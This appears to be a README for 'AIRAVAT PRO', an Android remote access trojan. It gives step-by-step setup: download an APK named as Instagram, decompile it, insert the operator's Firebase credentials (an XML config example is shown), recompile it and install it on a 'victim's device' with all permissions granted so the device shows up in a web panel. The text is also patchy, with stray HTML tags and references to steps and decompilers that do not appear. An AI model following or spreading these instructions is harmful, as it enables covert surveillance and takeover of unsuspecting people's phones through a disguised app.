## AIRAVAT PRO

Don't forget to add firebase url in ```smali_classes3/sigma/male/MainActivity.smali``` search for ```databaseURL``` and change it to your database url
  </div>
  <div class="column">
    <img src="https://github.com/alvinbaby/AIRAVAT-PRO/blob/main/Img/4.jpg" alt="AIRAVAT-PRO" style="width:50%">
  </div>

## Video 
https://user-images.githubusercontent.com/112254347/188288155-6d843d58-443a-4cc7-9306-83869c42b076.mp4

### Android RAT
 1. Download [Instagram.apk](./ANDROID%20APP/AndroidApp.apk)
 1. Decompile it using any Decompiler recommend above.
 1. Now open `res/values/strings.xml` file.
 1. Replace values of `firebase_database_url ` , `google_api_key` , `google_app_id` , `google_storage_bucket` , `project_id` with your Firebase Account using `google-services.json` file which you have downloaded on step 5
    - Example 
       ```xml 
       <string name="firebase_database_url">https://your_database_url.firebase.com</string>
       <string name="google_api_key">your_api_key</string>
       <string name="google_app_id">your_app_id</string>
       <string name="google_storage_bucket">your_storage_bucket_url</string>
       <string name="project_id">project_id</string>
       ```
 1. Now compile the code with appt2.
 1. Install the app in victim's device and give all the permissions after that the connection will show up in web panel.

### ❤️Supporters❤️
*https://github.com/Th30neAnd0nly

*https://github.com/AIRAVAT-pro
